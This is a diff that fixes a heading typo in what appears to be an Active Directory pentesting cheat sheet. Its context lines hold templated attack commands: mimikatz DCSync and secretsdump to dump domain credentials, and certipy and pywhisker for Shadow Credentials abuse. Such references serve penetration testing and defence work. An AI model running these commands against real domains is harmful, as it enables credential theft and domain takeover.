@@ -5,7 +5,7 @@
 - `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
 - `secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'`
 
-## can change msDS-KeyCredentialLInk (Generic Write) + ADCS >>> PassTheCertificate
+## can change msDS-KeyCredentialLink (Generic Write) + ADCS >>> PassTheCertificate
 - Shadow Credentials
   - `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'`
   - `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"`
